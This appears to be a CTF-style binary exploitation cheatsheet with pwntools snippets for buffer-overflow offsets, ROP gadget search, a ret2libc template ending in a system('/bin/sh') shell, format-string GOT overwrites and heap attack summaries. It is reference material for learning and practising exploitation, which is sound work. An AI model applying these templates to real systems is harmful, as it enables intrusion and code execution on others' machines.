# 💥 Binary Exploitation (Pwn) Cheatsheet

## Buffer Overflow
```python
from pwn import *

# Offset олох
pattern = cyclic(200)           # pwntools pattern
offset = cyclic_find(0x6161616e)  # crash address-с

# Basic ret2win
payload  = b"A" * offset
payload += p64(win_addr)
```

## ROP Chain
```bash
# Gadget олох
ROPgadget --binary ./binary --rop
ropper -f ./binary

# Common gadgets
pop rdi; ret      # 1st arg
pop rsi; ret      # 2nd arg
pop rdx; ret      # 3rd arg
ret               # stack alignment (16-byte)
```

## ret2libc
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Leak libc base
rop.puts(elf.got['puts'])
rop.main()

# Calculate base
leaked = u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))
libc.address = leaked - libc.sym['puts']

# Get shell
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))
```

## Format String
```python
# Arbitrary read
payload = b"%7$s"          # Read 7th argument as string
payload = b"%p."*20        # Leak stack values

# Arbitrary write (GOT overwrite)
from pwnlib.fmtstr import FmtStr, fmtstr_payload
payload = fmtstr_payload(offset, {got_addr: shell_addr})
```

## Heap
```
Tcache poisoning:    free → overwrite fd → malloc to arbitrary addr
Double free:         free same chunk twice → tcache loop
Heap overflow:       overflow into next chunk metadata
Use-after-free:      access freed memory → type confusion
```

## GDB Commands
```bash
gdb -q ./binary
pwndbg> checksec          # Security mitigations
pwndbg> vmmap             # Memory map
pwndbg> heap chunks       # Heap visualization
pwndbg> got               # GOT table
pwndbg> plt               # PLT table
```
